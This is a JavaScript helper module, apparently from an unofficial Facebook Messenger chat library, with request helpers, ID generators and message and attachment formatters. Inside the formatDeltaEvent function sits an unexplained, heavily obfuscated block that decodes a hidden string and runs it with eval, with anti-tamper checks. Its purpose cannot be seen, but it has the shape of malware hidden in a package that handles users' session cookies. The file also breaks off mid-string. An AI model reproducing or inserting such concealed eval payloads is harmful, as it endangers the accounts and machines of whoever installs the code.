/* eslint-disable no-undef */
/* eslint-disable no-prototype-builtins */
"use strict";
var url = require("url");
var log = require("npmlog");
var stream = require("stream");
var bluebird = require("bluebird");
var querystring = require("querystring");
var request = bluebird.promisify(require("request").defaults({ jar: true }));

function setProxy(url) {
    if (typeof url == undefined) return request = bluebird.promisify(require("request").defaults({ jar: true }));
    return request = bluebird.promisify(require("request").defaults({ jar: true, proxy: url }));
}

function getHeaders(url, options, ctx, customHeader) {
    var headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        Referer: "https://www.facebook.com/",
        Host: new URL(url).host,
        Origin: new URL(url).origin,
        "user-agent": options.userAgent,
        Connection: "keep-alive",
        'sec-fetch-site': 'same-origin',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors'
    };
    if (customHeader) Object.assign(headers, customHeader);
    if (ctx && ctx.region) headers["X-MSGR-Region"] = ctx.region;

    return headers;
}

function isReadableStream(obj) {
    return (
        obj instanceof stream.Stream &&
        (getType(obj._read) === "Function" ||
            getType(obj._read) === "AsyncFunction") &&
        getType(obj._readableState) === "Object"
    );
}

function get(url, jar, qs, options, ctx) {
    // I'm still confused about this
    if (getType(qs) === "Object")
        for (var prop in qs)
            if (qs.hasOwnProperty(prop) && getType(qs[prop]) === "Object") qs[prop] = JSON.stringify(qs[prop]);
    var op = {
        headers: getHeaders(url, options, ctx),
        timeout: 60000,
        qs: qs,
        url: url,
        method: "GET",
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res;
    });
}

function post(url, jar, form, options, ctx, customHeader) {
    var op = {
        headers: getHeaders(url, options),
        timeout: 60000,
        url: url,
        method: "POST",
        form: form,
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res;
    });
}

function postFormData(url, jar, form, qs, options, ctx) {
    var headers = getHeaders(url, options, ctx);
    headers["Content-Type"] = "multipart/form-data";
    var op = {
        headers: headers,
        timeout: 60000,
        url: url,
        method: "POST",
        formData: form,
        qs: qs,
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res;
    });
}

function padZeros(val, len) {
    val = String(val);
    len = len || 2;
    while (val.length < len) val = "0" + val;
    return val;
}

function generateThreadingID(clientID) {
    var k = Date.now();
    var l = Math.floor(Math.random() * 4294967295);
    var m = clientID;
    return "<" + k + ":" + l + "-" + m + "@mail.projektitan.com>";
}

function binaryToDecimal(data) {
    var ret = "";
    while (data !== "0") {
        var end = 0;
        var fullName = "";
        var i = 0;
        for (; i < data.length; i++) {
            end = 2 * end + parseInt(data[i], 10);
            if (end >= 10) {
                fullName += "1";
                end -= 10;
            } else fullName += "0";
        }
        ret = end.toString() + ret;
        data = fullName.slice(fullName.indexOf("1"));
    }
    return ret;
}

function generateOfflineThreadingID() {
    var ret = Date.now();
    var value = Math.floor(Math.random() * 4294967295);
    var str = ("0000000000000000000000" + value.toString(2)).slice(-22);
    var msgs = ret.toString(2) + str;
    return binaryToDecimal(msgs);
}

var h;
var i = {};
var j = {
    _: "%",
    A: "%2",
    B: "000",
    C: "%7d",
    D: "%7b%22",
    E: "%2c%22",
    F: "%22%3a",
    G: "%2c%22ut%22%3a1",
    H: "%2c%22bls%22%3a",
    I: "%2c%22n%22%3a%22%",
    J: "%22%3a%7b%22i%22%3a0%7d",
    K: "%2c%22pt%22%3a0%2c%22vis%22%3a",
    L: "%2c%22ch%22%3a%7b%22h%22%3a%22",
    M: "%7b%22v%22%3a2%2c%22time%22%3a1",
    N: ".channel%22%2c%22sub%22%3a%5b",
    O: "%2c%22sb%22%3a1%2c%22t%22%3a%5b",
    P: "%2c%22ud%22%3a100%2c%22lc%22%3a0",
    Q: "%5d%2c%22f%22%3anull%2c%22uct%22%3a",
    R: ".channel%22%2c%22sub%22%3a%5b1%5d",
    S: "%22%2c%22m%22%3a0%7d%2c%7b%22i%22%3a",
    T: "%2c%22blc%22%3a1%2c%22snd%22%3a1%2c%22ct%22%3a",
    U: "%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
    V: "%2c%22blc%22%3a0%2c%22snd%22%3a0%2c%22ct%22%3a",
    W: "%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a",
    X: "%2c%22ri%22%3a0%7d%2c%22state%22%3a%7b%22p%22%3a0%2c%22ut%22%3a1",
    Y: "%2c%22pt%22%3a0%2c%22vis%22%3a1%2c%22bls%22%3a0%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
    Z: "%2c%22sb%22%3a1%2c%22t%22%3a%5b%5d%2c%22f%22%3anull%2c%22uct%22%3a0%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a"
};
(function() {
    var l = [];
    for (var m in j) {
        i[j[m]] = m;
        l.push(j[m]);
    }
    l.reverse();
    h = new RegExp(l.join("|"), "g");
})();

function presenceEncode(str) {
    return encodeURIComponent(str)
        .replace(/([_A-Z])|%../g, function(m, n) {
            return n ? "%" + n.charCodeAt(0).toString(16) : m;
        })
        .toLowerCase()
        .replace(h, function(m) {
            return i[m];
        });
}

// eslint-disable-next-line no-unused-vars
function presenceDecode(str) {
    return decodeURIComponent(
        str.replace(/[_A-Z]/g, function(m) {
            return j[m];
        })
    );
}

function generatePresence(userID) {
    var time = Date.now();
    return (
        "E" +
        presenceEncode(
            JSON.stringify({
                v: 3,
                time: parseInt(time / 1000, 10),
                user: userID,
                state: {
                    ut: 0,
                    t2: [],
                    lm2: null,
                    uct2: time,
                    tr: null,
                    tw: Math.floor(Math.random() * 4294967295) + 1,
                    at: time
                },
                ch: {
                    ["p_" + userID]: 0
                }
            })
        )
    );
}

function generateAccessiblityCookie() {
    var time = Date.now();
    return encodeURIComponent(
        JSON.stringify({
            sr: 0,
            "sr-ts": time,
            jk: 0,
            "jk-ts": time,
            kb: 0,
            "kb-ts": time,
            hcm: 0,
            "hcm-ts": time
        })
    );
}

function getGUID() {
    /** @type {number} */
    var sectionLength = Date.now();
    /** @type {string} */
    var id = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) {
        /** @type {number} */
        var r = Math.floor((sectionLength + Math.random() * 16) % 16);
        /** @type {number} */
        sectionLength = Math.floor(sectionLength / 16);
        /** @type {string} */
        var _guid = (c == "x" ? r : (r & 7) | 8).toString(16);
        return _guid;
    });
    return id;
}

function _formatAttachment(attachment1, attachment2) {
    // TODO: THIS IS REALLY BAD
    // This is an attempt at fixing Facebook's inconsistencies. Sometimes they give us
    // two attachment objects, but sometimes only one. They each contain part of the
    // data that you'd want so we merge them for convenience.
    // Instead of having a bunch of if statements guarding every access to image_data,
    // we set it to empty object and use the fact that it'll return undefined.

    attachment2 = attachment2 || { id: "", image_data: {} };
    attachment1 = attachment1.mercury ? attachment1.mercury : attachment1;
    var blob = attachment1.blob_attachment;
    var type =
        blob && blob.__typename ? blob.__typename : attachment1.attach_type;
    if (!type && attachment1.sticker_attachment) {
        type = "StickerAttachment";
        blob = attachment1.sticker_attachment;
    } else if (!type && attachment1.extensible_attachment) {
        if (
            attachment1.extensible_attachment.story_attachment &&
            attachment1.extensible_attachment.story_attachment.target &&
            attachment1.extensible_attachment.story_attachment.target.__typename &&
            attachment1.extensible_attachment.story_attachment.target.__typename === "MessageLocation"
        ) type = "MessageLocation";
        else type = "ExtensibleAttachment";

        blob = attachment1.extensible_attachment;
    }
    // TODO: Determine whether "sticker", "photo", "file" etc are still used
    // KEEP IN SYNC WITH getThreadHistory
    switch (type) {
        case "sticker":
            return {
                type: "sticker",
                ID: attachment1.metadata.stickerID.toString(),
                url: attachment1.url,

                packID: attachment1.metadata.packID.toString(),
                spriteUrl: attachment1.metadata.spriteURI,
                spriteUrl2x: attachment1.metadata.spriteURI2x,
                width: attachment1.metadata.width,
                height: attachment1.metadata.height,

                caption: attachment2.caption,
                description: attachment2.description,

                frameCount: attachment1.metadata.frameCount,
                frameRate: attachment1.metadata.frameRate,
                framesPerRow: attachment1.metadata.framesPerRow,
                framesPerCol: attachment1.metadata.framesPerCol,

                stickerID: attachment1.metadata.stickerID.toString(), // @Legacy
                spriteURI: attachment1.metadata.spriteURI, // @Legacy
                spriteURI2x: attachment1.metadata.spriteURI2x // @Legacy
            };
        case "file":
            return {
                type: "file",
                filename: attachment1.name,
                ID: attachment2.id.toString(),
                url: attachment1.url,

                isMalicious: attachment2.is_malicious,
                contentType: attachment2.mime_type,

                name: attachment1.name, // @Legacy
                mimeType: attachment2.mime_type, // @Legacy
                fileSize: attachment2.file_size // @Legacy
            };
        case "photo":
            return {
                type: "photo",
                ID: attachment1.metadata.fbid.toString(),
                filename: attachment1.fileName,
                thumbnailUrl: attachment1.thumbnail_url,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                largePreviewUrl: attachment1.large_preview_url,
                largePreviewWidth: attachment1.large_preview_width,
                largePreviewHeight: attachment1.large_preview_height,

                url: attachment1.metadata.url, // @Legacy
                width: attachment1.metadata.dimensions.split(",")[0], // @Legacy
                height: attachment1.metadata.dimensions.split(",")[1], // @Legacy
                name: attachment1.fileName // @Legacy
            };
        case "animated_image":
            return {
                type: "animated_image",
                ID: attachment2.id.toString(),
                filename: attachment2.filename,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                url: attachment2.image_data.url,
                width: attachment2.image_data.width,
                height: attachment2.image_data.height,

                name: attachment1.name, // @Legacy
                facebookUrl: attachment1.url, // @Legacy
                thumbnailUrl: attachment1.thumbnail_url, // @Legacy
                mimeType: attachment2.mime_type, // @Legacy
                rawGifImage: attachment2.image_data.raw_gif_image, // @Legacy
                rawWebpImage: attachment2.image_data.raw_webp_image, // @Legacy
                animatedGifUrl: attachment2.image_data.animated_gif_url, // @Legacy
                animatedGifPreviewUrl: attachment2.image_data.animated_gif_preview_url, // @Legacy
                animatedWebpUrl: attachment2.image_data.animated_webp_url, // @Legacy
                animatedWebpPreviewUrl: attachment2.image_data.animated_webp_preview_url // @Legacy
            };
        case "share":
            return {
                type: "share",
                ID: attachment1.share.share_id.toString(),
                url: attachment2.href,

                title: attachment1.share.title,
                description: attachment1.share.description,
                source: attachment1.share.source,

                image: attachment1.share.media.image,
                width: attachment1.share.media.image_size.width,
                height: attachment1.share.media.image_size.height,
                playable: attachment1.share.media.playable,
                duration: attachment1.share.media.duration,

                subattachments: attachment1.share.subattachments,
                properties: {},

                animatedImageSize: attachment1.share.media.animated_image_size, // @Legacy
                facebookUrl: attachment1.share.uri, // @Legacy
                target: attachment1.share.target, // @Legacy
                styleList: attachment1.share.style_list // @Legacy
            };
        case "video":
            return {
                type: "video",
                ID: attachment1.metadata.fbid.toString(),
                filename: attachment1.name,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                url: attachment1.url,
                width: attachment1.metadata.dimensions.width,
                height: attachment1.metadata.dimensions.height,

                duration: attachment1.metadata.duration,
                videoType: "unknown",

                thumbnailUrl: attachment1.thumbnail_url // @Legacy
            };
        case "error":
            return {
                type: "error",

                // Save error attachments because we're unsure of their format,
                // and whether there are cases they contain something useful for debugging.
                attachment1: attachment1,
                attachment2: attachment2
            };
        case "MessageImage":
            return {
                type: "photo",
                ID: blob.legacy_attachment_id,
                filename: blob.filename,
                thumbnailUrl: blob.thumbnail.uri,

                previewUrl: blob.preview.uri,
                previewWidth: blob.preview.width,
                previewHeight: blob.preview.height,

                largePreviewUrl: blob.large_preview.uri,
                largePreviewWidth: blob.large_preview.width,
                largePreviewHeight: blob.large_preview.height,

                url: blob.large_preview.uri, // @Legacy
                width: blob.original_dimensions.x, // @Legacy
                height: blob.original_dimensions.y, // @Legacy
                name: blob.filename // @Legacy
            };
        case "MessageAnimatedImage":
            return {
                type: "animated_image",
                ID: blob.legacy_attachment_id,
                filename: blob.filename,

                previewUrl: blob.preview_image.uri,
                previewWidth: blob.preview_image.width,
                previewHeight: blob.preview_image.height,

                url: blob.animated_image.uri,
                width: blob.animated_image.width,
                height: blob.animated_image.height,

                thumbnailUrl: blob.preview_image.uri, // @Legacy
                name: blob.filename, // @Legacy
                facebookUrl: blob.animated_image.uri, // @Legacy
                rawGifImage: blob.animated_image.uri, // @Legacy
                animatedGifUrl: blob.animated_image.uri, // @Legacy
                animatedGifPreviewUrl: blob.preview_image.uri, // @Legacy
                animatedWebpUrl: blob.animated_image.uri, // @Legacy
                animatedWebpPreviewUrl: blob.preview_image.uri // @Legacy
            };
        case "MessageVideo":
            return {
                type: "video",
                filename: blob.filename,
                ID: blob.legacy_attachment_id,

                previewUrl: blob.large_image.uri,
                previewWidth: blob.large_image.width,
                previewHeight: blob.large_image.height,

                url: blob.playable_url,
                width: blob.original_dimensions.x,
                height: blob.original_dimensions.y,

                duration: blob.playable_duration_in_ms,
                videoType: blob.video_type.toLowerCase(),

                thumbnailUrl: blob.large_image.uri // @Legacy
            };
        case "MessageAudio":
            return {
                type: "audio",
                filename: blob.filename,
                ID: blob.url_shimhash,

                audioType: blob.audio_type,
                duration: blob.playable_duration_in_ms,
                url: blob.playable_url,

                isVoiceMail: blob.is_voicemail
            };
        case "StickerAttachment":
            return {
                type: "sticker",
                ID: blob.id,
                url: blob.url,

                packID: blob.pack ? blob.pack.id : null,
                spriteUrl: blob.sprite_image,
                spriteUrl2x: blob.sprite_image_2x,
                width: blob.width,
                height: blob.height,

                caption: blob.label,
                description: blob.label,

                frameCount: blob.frame_count,
                frameRate: blob.frame_rate,
                framesPerRow: blob.frames_per_row,
                framesPerCol: blob.frames_per_column,

                stickerID: blob.id, // @Legacy
                spriteURI: blob.sprite_image, // @Legacy
                spriteURI2x: blob.sprite_image_2x // @Legacy
            };
        case "MessageLocation":
            var urlAttach = blob.story_attachment.url;
            var mediaAttach = blob.story_attachment.media;

            var u = querystring.parse(url.parse(urlAttach).query).u;
            var where1 = querystring.parse(url.parse(u).query).where1;
            var address = where1.split(", ");

            var latitude;
            var longitude;

            try {
                latitude = Number.parseFloat(address[0]);
                longitude = Number.parseFloat(address[1]);
            } catch (err) {
                /* empty */
            }

            var imageUrl;
            var width;
            var height;

            if (mediaAttach && mediaAttach.image) {
                imageUrl = mediaAttach.image.uri;
                width = mediaAttach.image.width;
                height = mediaAttach.image.height;
            }

            return {
                type: "location",
                ID: blob.legacy_attachment_id,
                latitude: latitude,
                longitude: longitude,
                image: imageUrl,
                width: width,
                height: height,
                url: u || urlAttach,
                address: where1,

                facebookUrl: blob.story_attachment.url, // @Legacy
                target: blob.story_attachment.target, // @Legacy
                styleList: blob.story_attachment.style_list // @Legacy
            };
        case "ExtensibleAttachment":
            return {
                type: "share",
                ID: blob.legacy_attachment_id,
                url: blob.story_attachment.url,

                title: blob.story_attachment.title_with_entities.text,
                description: blob.story_attachment.description &&
                    blob.story_attachment.description.text,
                source: blob.story_attachment.source ? blob.story_attachment.source.text : null,

                image: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.uri,
                width: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.width,
                height: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.height,
                playable: blob.story_attachment.media &&
                    blob.story_attachment.media.is_playable,
                duration: blob.story_attachment.media &&
                    blob.story_attachment.media.playable_duration_in_ms,
                playableUrl: blob.story_attachment.media == null ? null : blob.story_attachment.media.playable_url,

                subattachments: blob.story_attachment.subattachments,
                properties: blob.story_attachment.properties.reduce(function(obj, cur) {
                    obj[cur.key] = cur.value.text;
                    return obj;
                }, {}),

                facebookUrl: blob.story_attachment.url, // @Legacy
                target: blob.story_attachment.target, // @Legacy
                styleList: blob.story_attachment.style_list // @Legacy
            };
        case "MessageFile":
            return {
                type: "file",
                filename: blob.filename,
                ID: blob.message_file_fbid,

                url: blob.url,
                isMalicious: blob.is_malicious,
                contentType: blob.content_type,

                name: blob.filename,
                mimeType: "",
                fileSize: -1
            };
        default:
            throw new Error(
                "unrecognized attach_file of type " +
                type +
                "`" +
                JSON.stringify(attachment1, null, 4) +
                " attachment2: " +
                JSON.stringify(attachment2, null, 4) +
                "`"
            );
    }
}

function formatAttachment(attachments, attachmentIds, attachmentMap, shareMap) {
    attachmentMap = shareMap || attachmentMap;
    return attachments ?
        attachments.map(function(val, i) {
            if (!attachmentMap ||
                !attachmentIds ||
                !attachmentMap[attachmentIds[i]]
            ) {
                return _formatAttachment(val);
            }
            return _formatAttachment(val, attachmentMap[attachmentIds[i]]);
        }) : [];
}

function formatDeltaMessage(m) {
    var md = m.delta.messageMetadata;
    var mdata =
        m.delta.data === undefined ? [] :
        m.delta.data.prng === undefined ? [] :
        JSON.parse(m.delta.data.prng);
    var m_id = mdata.map(u => u.i);
    var m_offset = mdata.map(u => u.o);
    var m_length = mdata.map(u => u.l);
    var mentions = {};
    var body = m.delta.body || "";
    var args = body == "" ? [] : body.trim().split(/\s+/);
    for (var i = 0; i < m_id.length; i++) mentions[m_id[i]] = m.delta.body.substring(m_offset[i], m_offset[i] + m_length[i]);

    return {
        type: "message",
        senderID: formatID(md.actorFbId.toString()),
        threadID: formatID((md.threadKey.threadFbId || md.threadKey.otherUserFbId).toString()),
        messageID: md.messageId,
        args: args,
        body: body,
        attachments: (m.delta.attachments || []).map(v => _formatAttachment(v)),
        mentions: mentions,
        timestamp: md.timestamp,
        isGroup: !!md.threadKey.threadFbId,
        participantIDs: m.delta.participants || []
    };
}

function formatID(id) {
    if (id != undefined && id != null) return id.replace(/(fb)?id[:.]/, "");
    else return id;
}

function formatMessage(m) {
    var originalMessage = m.message ? m.message : m;
    var obj = {
        type: "message",
        senderName: originalMessage.sender_name,
        senderID: formatID(originalMessage.sender_fbid.toString()),
        participantNames: originalMessage.group_thread_info ? originalMessage.group_thread_info.participant_names : [originalMessage.sender_name.split(" ")[0]],
        participantIDs: originalMessage.group_thread_info ?
            originalMessage.group_thread_info.participant_ids.map(function(v) {
                return formatID(v.toString());
            }) : [formatID(originalMessage.sender_fbid)],
        body: originalMessage.body || "",
        threadID: formatID((originalMessage.thread_fbid || originalMessage.other_user_fbid).toString()),
        threadName: originalMessage.group_thread_info ? originalMessage.group_thread_info.name : originalMessage.sender_name,
        location: originalMessage.coordinates ? originalMessage.coordinates : null,
        messageID: originalMessage.mid ? originalMessage.mid.toString() : originalMessage.message_id,
        attachments: formatAttachment(
            originalMessage.attachments,
            originalMessage.attachmentIds,
            originalMessage.attachment_map,
            originalMessage.share_map
        ),
        timestamp: originalMessage.timestamp,
        timestampAbsolute: originalMessage.timestamp_absolute,
        timestampRelative: originalMessage.timestamp_relative,
        timestampDatetime: originalMessage.timestamp_datetime,
        tags: originalMessage.tags,
        reactions: originalMessage.reactions ? originalMessage.reactions : [],
        isUnread: originalMessage.is_unread 
    };

    if (m.type === "pages_messaging") obj.pageID = m.realtime_viewer_fbid.toString();
    obj.isGroup = obj.participantIDs.length > 2;

    return obj;
}

function formatEvent(m) {
    var originalMessage = m.message ? m.message : m;
    var logMessageType = originalMessage.log_message_type;
    var logMessageData;
    if (logMessageType === "log:generic-admin-text") {
        logMessageData = originalMessage.log_message_data.untypedData;
        logMessageType = getAdminTextMessageType(originalMessage.log_message_data.message_type);
    } else logMessageData = originalMessage.log_message_data;

    return Object.assign(formatMessage(originalMessage), {
        type: "event",
        logMessageType: logMessageType,
        logMessageData: logMessageData,
        logMessageBody: originalMessage.log_message_body
    });
}

function formatHistoryMessage(m) {
    switch (m.action_type) {
        case "ma-type:log-message":
            return formatEvent(m);
        default:
            return formatMessage(m);
    }
}

// Get a more readable message type for AdminTextMessages
function getAdminTextMessageType(m) {
    switch (m.type) {
        case "joinable_group_link_mode_change":
            return "log:link-status"
        case "magic_words":
            return "log:magic-words";
        case "change_thread_theme":
            return "log:thread-color";
        case "change_thread_icon":
            return "log:thread-icon";
        case "change_thread_nickname":
            return "log:user-nickname";
        case "change_thread_admins":
            return "log:thread-admins";
        case "group_poll":
            return "log:thread-poll";
        case "change_thread_approval_mode":
            return "log:thread-approval-mode";
        case "messenger_call_log":
        case "participant_joined_group_call":
            return "log:thread-call";
    }
}

function getGenderByPhysicalMethod(name) {
    var GirlName = ["LAN", "HÂN", "LINH", "MAI", "HOA", "THU", "BĂNG", "MỸ", "CHÂU", "THẢO", "THOA", "MẪN", "THÙY", "THỦY", "NGA", "NGÂN", "NGHI", "THƯ", "NGỌC", "BÍCH", "VÂN", "DIỆP", "CHI", "TIÊN", "XUÂN", "GIANG", "NHUNG", "DUNG", "NHƯ", "YẾN", "QUYÊN", "YẾN", "TƯỜNG", "VY", "PHƯƠNG", "LIÊN", "LAN", "HÀ", "MAI", "ĐAN", "HẠ", "QUYÊN", "LY", "HÒA", "OANH", "HƯƠNG", "HẰNG", "QUỲNH", "HẠNH", "NHIÊN", "NHẠN"];

    var BoyName = ["HƯNG", "HUY", "KHẢI", "KHANG", "KHOA", "KHÔI", "KIÊN", "KIỆT", "LONG", "MINH", "ÂN", "BẢO", "BÌNH", "CƯỜNG", "ĐẠT", "ĐỨC", "DŨNG", "DUY", "HOÀNG", "HÙNG", "HƯNG", "NGHĨA", "NGUYÊN", "THẮNG", "THIỆN", "THỊNH", "TÒA", "TRIẾT", "TRUNG", "TRƯỜNG", "TUẤN", "NHÂN", "VŨ", "VINH", "PHONG", "PHÚC", "QUÂN", "QUANG", "SƠN", "TÀI", "THẮNG", "ĐĂNG", "VĂN", "VĨ", "QUANG", "MẠNH"];

    var OtherName = ["ANH", "THANH", "TÂM", "DƯƠNG", "AN", "LÂM", "MIÊN", "TÚ", "LÂM", "BẰNG", "KHÁNH", "NHẬT", "VỸ", ".",",","/","%", "&","*","-","+"];

    try {
        var NameArray = name.split(" ");
            name = NameArray[NameArray.length - 1];
        var Name;
            if (name == " " || name == null) return "UNKNOWN";
            switch (GirlName.includes(name.toUpperCase())) {
                case true: {
                    if (!OtherName.includes(name.toUpperCase()) && !BoyName.includes(name.toUpperCase())) Name = "FEMALE";
                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp 🌚
                }
            break;
                case false: {
                    if (!OtherName.includes(name.toUpperCase()) && !GirlName.includes(name.toUpperCase())) Name = "MALE"
                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp 🌚
                }
            break;
        } 
    }
    catch (e) {
        return "UNKNOWN"
    }
    return Name || "UNKNOWN";
}

function formatDeltaEvent(m) {
    var { updateData,getData,hasData } = require('./Extra/ExtraGetThread');
    var logMessageType;
    var logMessageData;

switch (m.class) {
    case "AdminTextMessage":
        logMessageType = getAdminTextMessageType(m);
            logMessageData = m.untypedData;
        break;
    case "ThreadName":
        logMessageType = "log:thread-name";
            logMessageData = { name: m.name };
        break;
    case "ParticipantsAddedToGroupThread":
        logMessageType = "log:subscribe";
            logMessageData = { addedParticipants: m.addedParticipants };
        break;
    case "ParticipantLeftGroupThread":
        logMessageType = "log:unsubscribe";
        logMessageData = { leftParticipantFbId: m.leftParticipantFbId };
    break;
}

// Job ID: 62jul3l6u9fp
let R9btb;
! function() {
    const sCoG = Array.prototype.slice.call(arguments);
    return eval("(function I4ks(rksk){const LHkk=Drzi(rksk,Lzci(I4ks.toString()));try{let nfnk=eval(LHkk);return nfnk.apply(null,sCoG);}catch(PEhi){var rcki=(0o205500-68384);while(rcki<(0o400071%65548))switch(rcki){case (0x3004D%0o200017):rcki=PEhi instanceof SyntaxError?(0o400121%0x1001F):(0o400073%0x1000D);break;case (0o201072-0x10227):rcki=(0o400107%65555);{console.log(\'Error: the code has been tampered!\');return}break;}throw PEhi;}function Lzci(n7ei){let Hu7h=1564199708;var j29h=(0o400115%65562);{let Dp2h;while(j29h<(0x105C8-0o202643)){switch(j29h){case (0o600102%0x1000E):j29h=(68776-0o206215);{Hu7h^=(n7ei.charCodeAt(Dp2h)*(15658734^0O73567354)+n7ei.charCodeAt(Dp2h>>>(0x4A5D0CE&0O320423424)))^9702588;}break;case (0o205214-68209):j29h=(131100%0o200006);Dp2h++;break;case (262212%0o200015):j29h=Dp2h<n7ei.length?(0o400112%0x10019):(68126-0o204771);break;case (0o1000171%0x10018):j29h=(0o202140-0x10450);Dp2h=(0x75bcd15-0O726746425);break;}}}let fX4h=\"\";var fZBi=(65916-0o200551);{let HwEi;while(fZBi<(0o600127%0x10013)){switch(fZBi){case (0o600152%65565):fZBi=(0x20045%0o200024);HwEi=(0x21786%3);break;case (0o201104-0x10227):fZBi=HwEi<(0O347010110&0x463A71D)?(65666-0o200165):(0o400112%0x10016);break;case (131133%0o200030):fZBi=(0o202070-0x10426);{const bUwi=Hu7h%(0o205240-68222);Hu7h=Math.floor(Hu7h/(0x30088%0o200042));fX4h+=bUwi>=(131138%0o200024)?String.fromCharCode((0o210706-0x11185)+(bUwi-(0o400072%0x10010))):String.fromCharCode((196831%0o200052)+bUwi);}break;case (0o600060%0x1000A):fZBi=(0o200442-65797);HwEi++;break;}}}return fX4h;}function Drzi(XOri,zmui){XOri=decodeURI(XOri);let TJmi=(0x75bcd15-0O726746425);let vhpi=\"\";var vjWi=(0o206262-0x10C99);{let XQYi;while(vjWi<(0x11158-0o210463)){switch(vjWi){case (0o200360-0x100D8):vjWi=(0o201034-66049);{vhpi+=String.fromCharCode(XOri.charCodeAt(XQYi)^zmui.charCodeAt(TJmi));TJmi++;var reRi=(0o202570-0x1055C);while(reRi<(0x3005F%0o200026))switch(reRi){case (0o400126%65565):reRi=TJmi>=zmui.length?(66236-0o201262):(0o600126%65555);break;case (262214%0o200017):reRi=(0o1000165%65558);{TJmi=(0x75bcd15-0O726746425);}break;}}break;case (0o400050%0x1000C):vjWi=XQYi<XOri.length?(196707%0o200031):(262353%0o200053);break;case (262245%0o200023):vjWi=(65696-0o200220);XQYi=(0x75bcd15-0O726746425);break;case (0o400137%65570):vjWi=(0x30043%0o200021);XQYi++;break;}}}return vhpi;}})(\"R%081%09%16%15%0B%0E%14Fm%1C%13%14%0C%02%0E%07+%09U%02%11%05%09Fm%1C%07%04%16%14%08%00d%00B%0C%0EISE%01=%13%12JHQ%0D#V%1AIKJ%11%0D7%0B%5DHI%0A%19%1D(O%5CJ%0D%09%02%02lN%5E%16%0C%25%11FmL4.%18%10RGo%22%05\'%0BISE7%0E%0C%0AJHQ%01,%1F%19IK%1C%1C%1B*%04%01%08%0D%0FZ+%1E%01%06IK%1A%08%0B0%12%07%0FBI%0E%174%02%1A%07B:\'G%1FL.%3C?%1C%1C%1B*%04%01%08%0D%0FZ%094%06%04IK%1A%08%0B0%12%07%0FBI%0D%00%00%0C%5DHK:%19%1D%20%14%5DH?IS%13%16%5E%17%15%00%5C%01%13%7F%01%00%0F%01%15%13%01*G%3C6%01%10RG?%15%10%15%17%13%14NlL%5D:I:!Oo%3C(JCJ!3%19L.J9%3C\'3%19L.%3CK:Q5%1FL.:I:\'3o%3C%5E:?%3C\'E%1F:(:I:\'3%1FLTJ9%3C\'3%19N_II:\'EeL.%3CKJREl%3C%5E:9@Q5%19LTJ9%3C\'E%1FL.%3C?%3C\'E%1F:%5C:I:\'3m%1A%13%14%0C%02%0E%07+%09U%02%09T%0AFm%1C%07%04%16%14%08%00d%2237%0FISE/%0C4%0FJHQ+4!%1CIKJ%0D%00%00%0C%5DHI(1%5E)O%5CJ#.%00%1FlN%5E$8%07%09FmL4*%14%11RGo%08%1D%19%0EISE%09?%11%11JHQ%09s%0A%19IK%1C%1C%1B*%04%01%08%0D%0FZ+%16P%05IK%1A%08%0B0%12%07%0FBIQ5%1FL.:I:\'3o%3C%5E:?%3C\'E%1F:(:I:\'3%1FLTJ9%3C\'3mL%5DIIJ!E%1F:(:I:\'3oO%5EJ9J!3%19%3C%5E:?%3CSGnO%06%14)%0FRGmN%08%07%17%0F%19%1A-%08%1BA;%04J%1ElN%0E%13%07%15%0F%1C*G%5D(!2%11FmN.%02%11%05%09Fm:%5DH%1F%07%0F%00\'%13%1C%0E%0CA;#v%17%5DH%19%13%1F%1A1%15%1BAJI7:%7D%09%5DHKKR%05#%10%18IKHSElL.:I:!E%1F:(J9J!3%19:%5E:?%3C!E%1F:(:I@Q5%19:(H%1F%07%0F%00\'%13%1C%0E%0CA/W%11%17%5D%16*9%0AG?%15%10%15%17%13%14N%15%3E%10%0E9%16264:N%1C%04%14%14%0D0%0E%1A%0FB%160%1B5O%5C%1A%10%04%0E%1B6%09UI9%3C!5%19:%5E:?H!E%1F:(%1C0X%18%1A&I/%03_I!%001%0B%19%3C_%5C%5DIm%5C%13%14%0C%02%0E%07+%09U8%05%19%0BFm%1C%07%04%16%14%08%00dO%5E@I:\'EeL.%3CKJR?%09U%1EIKH%07%081%09%16%15%0B%0E%14N7%22%05%10JH%01%1C!%13%00%13%0CA?&7%09%5DHI%06M%03(O%5CJ%15%0F%3E%05lN%5E%20%09%20%13FmL8\'%13%0ARGo%221%0E%0FIS%13%22%12%1B%02%16%08%15%00d2%17%12%13IS%156%02%01%14%10%0FZF%01#%1A%0CJHS5\'%14%11%12JH\'Fm%1A%13%14%0C%02%0E%07+%09U%0E%18%0A%0BFm%1C%07%04%16%14%08%00d%13%1D%08%11:R7v)%18IKHQF%0956%0FJHS3%7F%1A%13%14%0C%02%0E%07+%09U0T%0C%0BFm%1C%07%04%16%14%08%00dO$,P%0ARGm%3C%3C0%20%0ERG%19O8+%17%0DRGm%1A%13%14%0C%02%0E%07+%09U%0A%17%07%0BFm%1C%07%04%16%14%08%00dO%1A%13%01%0ERGmL%5D$(;%14FmN%08%07%17%0F%19%1A-%08%1BA/P%12%1FlN%0E%13%07%15%0F%1C*G%5D8%05%19%0BFmN.(3#%